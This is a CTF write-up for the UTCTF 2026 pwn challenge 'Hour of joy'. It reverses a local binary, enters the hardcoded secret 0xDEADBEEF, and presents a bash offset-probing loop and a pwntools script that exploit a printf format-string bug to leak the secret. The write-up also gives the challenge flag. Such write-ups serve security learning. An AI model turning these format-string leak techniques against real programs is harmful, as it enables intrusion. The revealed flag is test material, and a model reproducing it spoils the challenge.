---
title: "Hour of joy - UTCTF 2026 write up"
date: 2026-03-17
categories: [CTF, Tournament]
tags: [UTCTF, pwn]
description: "No Description"
---

## Challenge Description
This program is very friendly. It just wants to say hello. Nothing suspicious going on here at all. Download the binary and run it locally. 

## Challenge Overview

This challenge provides us with a binary file. First, we try to check this binary:
```bash
$ file vuln               
vuln: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3b8bb05d807ee592c2224e7d1828fba58682d866, for GNU/Linux 3.2.0, not stripped

$ checksec --file=vuln
[*] '/home/kali/Desktop/wargame/joy/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

This result means:
- The binary is a 64-bit ELF with PIE enabled and symbols present (not stripped).
- **NX** prevents executing injected shellcode on the stack.
- **PIE** randomizes the code base; this is not an obstacle here since we do not need complex ROP.
- There is **no stack canary**, but there is no practical overflow primitive because `fgets` is bounded.
- **Full RELRO** prevents easy GOT overwrites.
- **SHSTK/IBT (CET)** are enabled, which increases the difficulty of control-flow hijacking.

Next, decompile the binary with IDA, we can see the pseudocode of binary's main:
```c
int __fastcall main(int argc, const char **argv, const char **envp) {
    int v4; // [rsp+Ch] [rbp-54h] BYREF
    char s[76]; // [rsp+10h] [rbp-50h] BYREF
    int v6; // [rsp+5Ch] [rbp-4h]

    setup(argc, argv, envp);
    v6 = -559038737;
    printf("What is your name? ");
    fgets(s, 64, stdin);
    s[strcspn(s, "\n")] = 0;
    printf("Hello, ");
    printf(s);
    puts("!");
    printf("Enter the secret code: ");
    __isoc99_scanf("%u", &v4);
    if ( v4 == v6 )
        print_flag();
    else
        puts("Wrong! Nice try.");
    return 0;
}
```

Based on the pseudocode, the important functions to analyze are `main`, `setup`, and `print_flag`. We'll inspect the disassembly to understand the program flow:
- `main()`:
    ```asm
    ; int __fastcall main(int argc, const char **argv, const char **envp)
                    public main
    main            proc near               ; DATA XREF: _start+18↑o

    var_54          = dword ptr -54h
    s               = byte ptr -50h
    var_4           = dword ptr -4

    ; __unwind {
                    endbr64
                    push    rbp
                    mov     rbp, rsp
                    sub     rsp, 60h
                    mov     eax, 0
                    call    setup
                    mov     [rbp+var_4], 0DEADBEEFh
                    lea     rax, format     ; "What is your name? "
                    mov     rdi, rax        ; format
                    mov     eax, 0
                    call    _printf
                    mov     rdx, cs:stdin@GLIBC_2_2_5 ; stream
                    lea     rax, [rbp+s]
                    mov     esi, 40h ; '@'  ; n
                    mov     rdi, rax        ; s
                    call    _fgets
                    lea     rax, [rbp+s]
                    lea     rdx, reject     ; "\n"
                    mov     rsi, rdx        ; reject
                    mov     rdi, rax        ; s
                    call    _strcspn
                    mov     [rbp+rax+s], 0
                    lea     rax, aHello     ; "Hello, "
                    mov     rdi, rax        ; format
                    mov     eax, 0
                    call    _printf
                    lea     rax, [rbp+s]
                    mov     rdi, rax        ; format
                    mov     eax, 0
                    call    _printf
                    lea     rax, s          ; "!"
                    mov     rdi, rax        ; s
                    call    _puts
                    lea     rax, aEnterTheSecret ; "Enter the secret code: "
                    mov     rdi, rax        ; format
                    mov     eax, 0
                    call    _printf
                    lea     rax, [rbp+var_54]
                    mov     rsi, rax
                    lea     rax, aU         ; "%u"
                    mov     rdi, rax
                    mov     eax, 0
                    call    ___isoc99_scanf
                    mov     edx, [rbp+var_54]
                    mov     eax, [rbp+var_4]
                    cmp     edx, eax
                    jnz     short loc_13A8
                    mov     eax, 0
                    call    print_flag
                    jmp     short loc_13B7
    ; ---------------------------------------------------------------------------

    loc_13A8:                               ; CODE XREF: main+CF↑j
                    lea     rax, aWrongNiceTry ; "Wrong! Nice try."
                    mov     rdi, rax        ; s
                    call    _puts

    loc_13B7:                               ; CODE XREF: main+DB↑j
                    mov     eax, 0
                    leave
                    retn
    ; } // starts at 12CB
    main            endp
    ```

    - Based on the assembly, the program performs these steps at runtime:
        - Configure stdio buffering in `setup()`.
        - Initialize stack local variable to `0xDEADBEEF`.
        - Prompt for name.
        - Read name with `fgets` into stack buffer.
        - Strip newline using `strcspn`.
        - Print greeting via `printf("Hello, ")` then **`printf(name)`
        - Prompt for secret code.
        - Read unsigned integer using `scanf("%u", &user_code)`.
        - Compare `user_code` with local secret (`0xDEADBEEF`).
        - If equal, call `print_flag()`, else print failure message.
    
    - Key details from the assembly:
        - `mov DWORD PTR [rbp-0x4],0xdeadbeef` stores the expected secret on the stack.
        - The name buffer is at `[rbp-0x50]` and is read with `fgets(..., 0x40, stdin)`.
        - The newline is removed using `strcspn` and a null terminator is written.
        - `printf(name)` introduces an **uncontrolled format-string vulnerability**.
        - The user-supplied secret is read at `[rbp-0x54]` via `scanf("%u", ...)`.
        - Control flow:
            - if equal → `call print_flag`
            - else → `puts("Wrong! Nice try.")`

- `setup()`: This function will calls `setvbuf(stdout, NULL, _IONBF, 0)` and same for `stdin` in order to deterministic I/O behavior for interactive challenge.
```asm
; __int64 __fastcall setup(_QWORD, _QWORD, _QWORD)
                public setup
setup           proc near               ; CODE XREF: main+11↓p
; __unwind {
                endbr64
                push    rbp
                mov     rbp, rsp
                mov     rax, cs:stdout@GLIBC_2_2_5
                mov     ecx, 0          ; n
                mov     edx, 2          ; modes
                mov     esi, 0          ; buf
                mov     rdi, rax        ; stream
                call    _setvbuf
                mov     rax, cs:stdin@GLIBC_2_2_5
                mov     ecx, 0          ; n
                mov     edx, 2          ; modes
                mov     esi, 0          ; buf
                mov     rdi, rax        ; stream
                call    _setvbuf
                nop
                pop     rbp
                retn
; } // starts at 1209
setup           endp
```

- `print_flag()`: This function stores obfuscated bytes on stack. Then it try loops index `i = 0..0x1b` (28 bytes). For each byte: `decoded = encoded_byte ^ 0x42`, then `putchar(decoded)`. Finally, it prints newline. This is the disassembly source code and pseudocode of this function:
```asm
; __int64 print_flag(void)
                public print_flag
print_flag      proc near               ; CODE XREF: main+D6↓p

var_20          = qword ptr -20h
var_18          = qword ptr -18h
var_C           = qword ptr -0Ch
var_4           = dword ptr -4

; __unwind {
                endbr64
                push    rbp
                mov     rbp, rsp
                sub     rsp, 20h
                mov     rax, 243925232E243637h
                mov     rdx, 36311D36762F3072h
                mov     [rbp+var_20], rax
                mov     [rbp+var_18], rdx
                mov     rax, 252C733036311D36h
                mov     rdx, 3F26712976712E1Dh
                mov     [rbp+var_18+4], rax
                mov     [rbp+var_C], rdx
                mov     [rbp+var_4], 0
                jmp     short loc_12B8
; ---------------------------------------------------------------------------

loc_129D:                               ; CODE XREF: print_flag+6C↓j
                mov     eax, [rbp+var_4]
                cdqe
                movzx   eax, byte ptr [rbp+rax+var_20]
                xor     eax, 42h
                movzx   eax, al
                mov     edi, eax        ; c
                call    _putchar
                add     [rbp+var_4], 1

loc_12B8:                               ; CODE XREF: print_flag+4B↑j
                cmp     [rbp+var_4], 1Bh
                jle     short loc_129D
                mov     edi, 0Ah        ; c
                call    _putchar
                nop
                leave
                retn
; } // starts at 1250
print_flag      endp
```

```c
int print_flag() {
    _DWORD v1[7]; // [rsp+0h] [rbp-20h] BYREF
    int i; // [rsp+1Ch] [rbp-4h]

    qmemcpy(v1, "76$.#%9$r0/v", 12);
    *(_QWORD *)&v1[3] = 0x252C733036311D36LL;
    *(_QWORD *)&v1[5] = 0x3F26712976712E1DLL;
    for ( i = 0; i <= 27; ++i )
        putchar(*((_BYTE *)v1 + i) ^ 0x42);
    return putchar(10);
}
```

## Exploitation Process

### Attempt 1: Memory corruption route
First we try some classical strategies. However this is not the correct path and here is the reason:
- stack overflow via name buffer? **No**: `fgets(name, 0x40, ...)` for a 64-byte destination is bounded.
- GOT overwrite? **No**: Full RELRO.
- shellcode injection? **No**: NX.
- ret2win by direct RIP overwrite? **No primitive** because no overflow.

### Attempt 2: Logic bypass
Looking into the disassembly, we can see some special things of this binary:
- local secret = `0xDEADBEEF`
- compared against `%u` input

Trying to convert the local secret into decimal:
```
0xDEADBEEF = 3735928559
```

So, since we will give the flag if our secret matched with the local secret of this binary, the input is `3735928559` will directly triggers `print_flag` and prints the flag:
```bash
$ ./vuln
What is your name? aaa
Hello, aaa!
Enter the secret code: 3735928559
utflag{f0rm4t_str1ng_l34k3d}
```

### Attempt 3: Format-string based leak
Based on the analysis, this binary has a format-string vulnerability at `printf(name)`. The exploitation path is:
- `printf(name)` allows reading stack values.
- We brute-forced positional `%i$p` (using `%%%d\$p`) and discovered that `offset=17` leaks a word containing `deadbeef` in the low 32 bits.
    ```bash
    for i in $(seq 1 80); do
    out=$( (printf "%%%d\$p\n0\n" "$i"; ) | ./vuln 2>/dev/null )
    if echo "$out" | grep -qi deadbeef; then
        echo "offset=$i"
        echo "$out"
        break
    fi
    done
    ```

    Output:
    ```text
    offset=17
    What is your name? Hello, 0xdeadbeef64181cd0!
    Enter the secret code: Wrong! Nice try.
    ```
- This enables scriptable extraction of secret instead of hardcoding.

This is the exploit code:
```python
#!/usr/bin/env python3
from pwn import *
import re

# -----------------------------------------------------------------------------
# Configuration
# -----------------------------------------------------------------------------
BINARY_PATH = "./vuln"
LEAK_OFFSET = 17  # discovered by brute force: %17$p leaks stack word with deadbeef in low dword

# Use local process (no remote for this challenge)
context.binary = ELF(BINARY_PATH)
context.log_level = "info"

# -----------------------------------------------------------------------------
# Helper: parse leaked pointer-like token and recover lower 32-bit secret
# -----------------------------------------------------------------------------
def parse_secret_from_line(line: bytes) -> int:
    """
    Extract first 0x... token from greeting line and return low 32 bits.
    Example token: 0xdeadbeef64181cd0 -> low32 could vary by layout,
    but for this challenge observed word contains deadbeef in lower dword for offset 17.
    """
    m = re.search(rb"0x[0-9a-fA-F]+", line)
    if not m:
        raise ValueError("No hex token leaked from format string")

    leaked_value = int(m.group(0), 16)
    low = leaked_value & 0xFFFFFFFF
    high = (leaked_value >> 32) & 0xFFFFFFFF

    if low == 0xDEADBEEF:
        return low
    if high == 0xDEADBEEF:
        return high

    return low

# -----------------------------------------------------------------------------
# Main exploit routine
# -----------------------------------------------------------------------------
def exploit_local() -> str:
    io = process(BINARY_PATH)

    # Step 1: trigger format-string leak from name prompt
    io.sendlineafter(b"What is your name? ", f"%{LEAK_OFFSET}$p".encode())

    # Step 2: capture greeting line containing the leaked pointer
    # Program prints: "Hello, <expanded_format>!"
    hello_line = io.recvline_contains(b"Hello, ")
    log.info(f"Greeting line: {hello_line!r}")

    # Step 3: recover candidate secret from leaked word
    secret = parse_secret_from_line(hello_line)
    log.success(f"Recovered secret candidate (uint32): {secret} (0x{secret:08x})")

    # Step 4: send the secret as decimal for scanf("%u", ...)
    io.sendlineafter(b"Enter the secret code: ", str(secret).encode())

    # Step 5: read final output and extract flag
    final_output = io.recvall(timeout=1).decode(errors="ignore")
    print(final_output)

    # Best-effort return first utflag-like token if present
    flag_match = re.search(r"utflag\{[^}]+\}", final_output)
    return flag_match.group(0) if flag_match else "FLAG_NOT_FOUND"


if __name__ == "__main__":
    flag = exploit_local()
    print(f"[+] Flag: {flag}")
```

Try to run this code and we will get the same flag as Attempt 2.
```bash
$  /home/kali/Desktop/wargame/.venv/bin/python exploit.py
[*] '/home/kali/Desktop/wargame/joy/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Starting local process './vuln': pid 29154
[*] Greeting line: b'Hello, 0xdeadbeeffa8f0cd0!'
[+] Recovered secret candidate (uint32): 3735928559 (0xdeadbeef)
[+] Receiving all data: Done (29B)
[*] Process './vuln' stopped with exit code 0 (pid 29154)
utflag{f0rm4t_str1ng_l34k3d}

[+] Flag: utflag{f0rm4t_str1ng_l34k3d}
```

## Technical Summary
### Vulnerability classification

1. **CWE-134: Uncontrolled Format String**
   - `printf(name)` where `name` is attacker-controlled.
2. **Insecure Hardcoded Secret / Logic flaw**
   - Secret code fixed as `0xDEADBEEF` and directly comparable.
3. **Weak obfuscation only**
   - `print_flag` uses trivial XOR-by-constant.

### Techniques used
- Static reversing via disassembly and symbol analysis.
- Dynamic validation in runtime/GDB.
- Format-string probing and positional offset brute-force.
- Exploit automation concept with pwntools.

## Challenge Source Code

Challenge's Github Repository: [hour_of_joy](https://github.com/UITxWoodyNguyen/CTF/tree/main/UTCTF-2026/pwn/hour-of-joy)